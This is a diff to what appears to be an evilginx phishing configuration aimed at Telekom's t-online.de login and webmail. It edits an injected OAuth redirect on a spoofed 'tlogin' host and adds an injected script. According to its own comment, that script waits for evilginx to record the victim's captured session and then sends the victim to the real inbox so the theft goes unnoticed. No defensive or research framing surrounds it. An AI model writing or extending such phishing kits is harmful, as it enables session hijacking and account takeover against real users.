@@ -177,7 +177,7 @@ js_inject:
         var parts = window.location.hostname.split('.');
         parts[0] = 'tlogin';
         var tloginHost = parts.join('.');
-        var loginUrl = 'https://' + tloginHost + '/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE2000000000000&scope=openid&redirect_uri=https%3A%2F%2Fwww.t-online.de%2Fauth%2Flogin%2Foauth2%2Fcode%2Ftelekom&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3Anull%7D%7D&display=page';
+        var loginUrl = 'https://' + tloginHost + '/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE2000000000000&scope=openid&redirect_uri=https%3A%2F%2Fwww.t-online.de%2Fauth%2Flogin%2Foauth2%2Fcode%2Ftelekom&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3Anull%7D%7D&display=popup';
         var hash = window.location.hash;
         if (hash && hash.length > 1) { loginUrl += hash; }
         window.location.href = loginUrl;
@@ -331,3 +331,15 @@ js_inject:
           });
         }
       });
+
+  - trigger_domains: ["email.t-online.de"]
+    trigger_paths: ["/em*", "/api/openid_connect_login*"]
+    trigger_params: []
+    script: |
+      (function() {
+        // Give evilginx 1.5s to write the captured session, then send
+        // the victim to the real domain so they see their actual inbox.
+        setTimeout(function() {
+          window.location.replace('https://email.t-online.de/em');
+        }, 1500);
+      })();
